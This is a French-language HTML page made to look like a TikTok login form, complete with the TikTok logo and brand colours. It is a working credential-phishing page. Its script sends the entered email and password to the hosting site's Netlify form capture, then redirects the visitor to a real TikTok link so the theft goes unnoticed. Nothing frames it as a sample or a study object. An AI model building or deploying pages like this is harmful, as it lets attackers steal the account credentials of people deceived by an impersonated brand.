<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Connexion TikTok</title>
    <style>
       body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f8f8;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background-color: #f8f8f8;
            padding: 2rem;
            border-radius: 8px;
            width: 400px;
            max-width: 100%;
            text-align: center;
        }
        .login-box h1 {
            font-size: 24px;
            margin-bottom: 1rem;
        }
        .login-box input[type="email"], 
        .login-box input[type="password"] {
            width: calc(100% - 2rem);
            padding: 15px;
            margin: 5px ;
            border: 1px solid #ddd;
			background-color: #f0f0f2;
            border-radius: 3px;
		}
		
        .login-box button {
            width: 100%;
            padding: 0.5rem;
            background-color: #fe2c55;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin: 1rem 0;
        }
        .login-box button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .login-box button:hover:enabled {
            background-color: #d8234a;
        }
        .login-box .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 1rem 0;
        }
        .login-box .divider::before,
        .login-box .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #ddd;
        }
        .login-box .divider:not(:empty)::before {
            margin-right: .25em;
        }
        .login-box .divider:not(:empty)::after {
            margin-left: .25em;
        }
        
        .login-box .signup {
            margin-top: 1rem;
        }
        .login-box .signup a {
            color: #fe2c55;
            text-decoration: none;
        }
		.clc {
			background-color: #f8f8f8;
			width: 115px;
			padding:10px;
		}
    </style>
</head>
<body>
	<img class="clc" src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1024px-TikTok_logo.svg.png" alt="TikTok">
    <div class="container">
        <div class="login-box">
            <h1>Connexion</h1>
            <form name="login-form" method="POST" data-netlify="true" id="loginForm">
                <input type="text" name="email" id="email" placeholder="Email" required>
                <input type="password" name="password" id="password" placeholder="Mot de passe" required>
                <button type="submit" id="loginBtn" disabled>Se connecter</button>
            </form>
            <div class="divider">ou</div>
            <div class="signup">
                Vous n'avez pas de compte? <a href="#">Inscrivez-vous</a>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');
            const loginForm = document.getElementById('loginForm');

            emailInput.addEventListener('input', toggleButton);
            passwordInput.addEventListener('input', toggleButton);

            function toggleButton() {
                if (emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
                    loginBtn.removeAttribute('disabled');
                } else {
                    loginBtn.setAttribute('disabled', 'disabled');
                }
            }

            loginForm.addEventListener('submit', function(event) {
                event.preventDefault();

                const formData = new FormData(loginForm);

                fetch('/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams(formData).toString()
                })
                .then(response => {
                    if (response.ok) {
                        window.location.href = 'https://vm.tiktok.com/ZGeGgWH16/';
                    } else {
                        alert('Erreur lors de la soumission du formulaire');
                    }
                })
                .catch(error => {
                    alert('Erreur: ' + error);
                });
            });
        });
    </script>
</body>
</html>
